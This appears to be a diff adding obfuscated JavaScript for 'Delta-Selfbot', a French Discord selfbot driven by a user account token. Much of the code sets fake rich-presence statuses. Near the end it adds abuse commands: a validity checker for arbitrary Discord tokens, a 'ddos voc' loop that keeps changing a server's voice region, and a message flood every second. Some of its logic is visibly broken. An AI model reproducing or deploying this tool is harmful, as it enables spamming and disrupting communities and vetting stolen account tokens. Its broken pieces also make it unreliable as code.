+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Twitter')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Twitter')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Twitter executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Twitter**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'instagram')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'instagram')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Instagram')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Instagram')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Instagram executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Instagram**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'youtube')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'youtube-don-george-floyd')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Youtube')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Youtube')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Youtube executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Youtube**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'tokyo ghoul')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'tokyoghoul')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Tokyo Ghoul')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Tokyo Ghoul')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Tokyo Ghoul executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(2)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Tokyo Ghoul**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'hunter x hunter')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(3)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'hunter-x-hunter-logo')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Hunter X Hunter')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Hunter X Hunter')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Hunter X Hunter executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(3)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Hunter X Hunter**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'naruto')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'narutoto')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Naruto')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Naruto')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Naruto executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Naruto**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'pornhub')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', '8zgrvjp7iab11')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Pornhub')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('WATCHING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Pornhub')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Pornhub executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Pornhub**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'clash of clan')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(3)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'clash-of-clans-app-icon')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Clash Of Clan')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Clash Of Clan executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(3)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Clash Of Clan**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'minecraft')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'minecraft-creeper-face')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Minecraft')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Minecraft executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Minecraft**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'clash royal')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'clashroyal')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Clash Royal')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Clash Royal executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(2)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Clash Royal**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'tinder')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'tinder')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Tinder')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Tinder executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Tinder**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'roblox')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'webp45')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Roblox')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Roblox executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Roblox**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'badlion')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Badlion')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Badlion executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Badlion**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'apex')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage_1_')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Apex Legends')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande Apex Legends executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur Apex Legends**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'csgo')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'previewfile_1508497274')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Counter Strike')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande csgo executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur csgo**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'among us')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage_2_')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Among us')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande among us executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(2)
+                            .join(' ') || 'Delta-Selfbot') + ' sur among us**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'fortnite')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Fortnite')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande fortnite executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
+                            .join(' ') || 'Delta-Selfbot') + ' sur fortnite**');
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'rocket league')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ') || 'Delta-Selfbot';
+            rpcGenerator.getRpcImage('721465320740487179', 'rocket_league')
+                .then(_0x18f2x2e =>
+
+                    {
+                        let _0x18f2x30 = new rpcGenerator.Rpc()
+                            .setName('Rocket League')
+                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
+                            .setType('PLAYING')
+                            .setApplicationId('721465320740487179')
+                            .setDetails('Delta Selfbot')
+                            .setAssetsLargeImage(_0x18f2x2e.id)
+                            .setAssetsLargeText('Delta-Selfbot')
+                            .setState(_0x18f2x40)
+                            .setStartTimestamp(Date.now())
+                            .setParty({
+                                id: uuid()
+                            });
+                        client.user.setPresence(_0x18f2x30.toDiscord())
+                            .catch(console.error);
+                        console.log('Commande rocket league executé'.yellow);
+                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(2)
+                            .join(' ') || 'Delta-Selfbot') + ' sur rocket league**');
+                    });
+        }
+        if (_0x18f2x3c.content === prefix + 'channels list') {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            if (!_0x18f2x3b.member.hasPermission('EMBED_LINKS')) {
+                return _0x18f2x3b['edit'](`${ ':x: **permission insuffisante (embed_links)** ' }${ _0x18f2x42['map'](_0x18f2x41 => {
+                    return _0x18f2x41['name'];
+                }) }${ '' }`);
+            }
+            const _0x18f2x42 = _0x18f2x3b.guild.channels;
+            var _0x18f2x43 = new Discord.RichEmbed()
+                .setFooter('Delta-Selfbot')
+                .setColor(color)
+                .addField('liste des salons:', _0x18f2x42.map(_0x18f2x41 =>
+
+                    {
+                        return _0x18f2x41.name;
+                    }));
+            for (pas = 0; pas < 10; pas++) {
+                _0x18f2x43.setColor(color);
+                _0x18f2x3b.edit(_0x18f2x43)
+                    .catch(_0x18f2x44 => {
+                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                        });
+            }
+            console.log('Commande channels list executé'.yellow);
+        }
+        if (_0x18f2x3c.content === prefix + 'roles list') {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            if (!_0x18f2x3b.member.hasPermission('EMBED_LINKS')) {
+                return _0x18f2x3b['edit'](`${ ':x: **permission insuffisante (embed_links)** ' }${ _0x18f2x46['map'](_0x18f2x45 => {
+                    return _0x18f2x45['name'];
+                }) }${ '' }`);
+            }
+            const _0x18f2x46 = _0x18f2x3b.guild.roles;
+            var _0x18f2x47 = new Discord.RichEmbed()
+                .setFooter('Delta-Selfbot')
+                .setColor(color)
+                .addField('liste des roles:', _0x18f2x46.map(_0x18f2x45 =>
+
+                    {
+                        return _0x18f2x45.name;
+                    }));
+            _0x18f2x3b.edit(_0x18f2x47)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande roles list executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'cmd') {
+            _0x18f2x3b.edit(cmd)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande cmd executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help') {
+            _0x18f2x3b.edit(help)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help backup') {
+            _0x18f2x3b.edit(help_backup)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help backup executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help hack') {
+            _0x18f2x3b.edit(help_hack)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help hack executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help statut') {
+            _0x18f2x3b.channel.send(help_statut2);
+            _0x18f2x3b.edit(help_statut)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help statut executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help fun') {
+            _0x18f2x3b.edit(help_fun)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help fun executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help moderation') {
+            _0x18f2x3b.edit(help_moderation)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help moderation executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help nsfw') {
+            _0x18f2x3b.edit(help_nsfw)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help nsfw executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'help utile') {
+            _0x18f2x3b.edit(help_info)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande help info executé'.yellow);
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
+            const _0x18f2x13 = _0x18f2x3b.mentions.users.first() || _0x18f2x3b.author;
+            const _0x18f2x48 = new Discord.RichEmbed()
+                .setAuthor(_0x18f2x13.username)
+                .setImage(_0x18f2x13.avatarURL)
+                .setColor(color)
+                .setFooter('Delta-Selfbot');
+            _0x18f2x3b.edit(_0x18f2x48)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande avatar executé'.yellow);
+        };
+        if (_0x18f2x3b.content === prefix + 'change hypesquad brilliance') {
+            let _0x18f2x49 = 'https://discordapp.com/api/v6/hypesquad/online';
+            request(_0x18f2x49, {
+                method: 'POST',
+                headers: {
+                    authorization: token,
+                    'content-type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+                },
+                body: JSON.stringify({
+                    'house_id': 2
+                })
+            });
+            _0x18f2x3c.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'brilliance\'**');
+            console.log('Commande change hypesquad executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'change hypesquad ballance') {
+            let _0x18f2x49 = 'https://discordapp.com/api/v6/hypesquad/online';
+            request(_0x18f2x49, {
+                method: 'POST',
+                headers: {
+                    authorization: token,
+                    'content-type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+                },
+                body: JSON.stringify({
+                    'house_id': 3
+                })
+            });
+            _0x18f2x3c.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'ballance\'**');
+            console.log('Commande change hypesquad executé'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'change hypesquad bravery') {
+            let _0x18f2x49 = 'https://discordapp.com/api/v6/hypesquad/online';
+            request(_0x18f2x49, {
+                method: 'POST',
+                headers: {
+                    authorization: token,
+                    'content-type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+                },
+                body: JSON.stringify({
+                    'house_id': 1
+                })
+            });
+            _0x18f2x3c.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'bravery\'**');
+            console.log('Commande change hypesquad executé'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'check token')) {
+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ');
+            let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
+            request(_0x18f2x49, {
+                    method: 'GET',
+                    headers: {
+                        authorization: _0x18f2x40
+                    }
+                }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)
+
+                {
+                    if (_0x18f2x4a.statusCode === 200) {
+                        var _0x18f2x4c = new Discord.RichEmbed()
+                            .setTitle('Token info')
+                            .setDescription('Le token: ' + _0x18f2x3d.splice(2)
+                                .join(' ') + ' \\n**est 100% valide** :white_check_mark:')
+                            .setColor(color)
+                            .setTimestamp()
+                            .setFooter('Delta Selfbot', _0x18f2x3b.author.avatarURL);
+                        _0x18f2x3b.edit(_0x18f2x4c)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                    }
+                });
+        }
+        if (_0x18f2x3b.content == prefix + 'ddos voc') {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            let _0x18f2x4e = 0;
+            const _0x18f2x4f = [
+                'japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'
+            ];
+            setInterval(() =>
+
+                {
+                    _0x18f2x3b.guild.setRegion('japan');
+                    0;
+                    if (1 == _0x18f2x4f.length) {
+                        _0x18f2x4e = 0;
+                    }
+                }, 1000);
+            _0x18f2x3c.edit('**Commande ddos vocal activé**');
+            console.log('Commande ddos vocal executé'.yellow);
+        }
+        if (_0x18f2x3b.content == prefix + 'ddos-stop') {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            clearInterval();
+            _0x18f2x3c.edit('**Commande ddos stopé**');
+            console.log('Commande ddos voc stopé'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'spam')) {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            let _0x18f2x50 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta Selfbot';
+            _0x18f2x3c.edit('**Wait...**');
+            setInterval(() =>
+
+                {
+                    _0x18f2x3c.channel.send(_0x18f2x50)
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                }, 1000);
+            console.log('Commande spam executé'.yellow);
+        }
+        if (_0x18f2x3b.content == prefix + 'stop spam') {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            clearInterval();
+            _0x18f2x3c.edit('**Commande spam stopé**');
+            client.destroy()
+                .then(() =>
+
+                    {
+                        return client['login'](token);
+                    });
+            console.log('Commande spam stopé'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'info token')) {
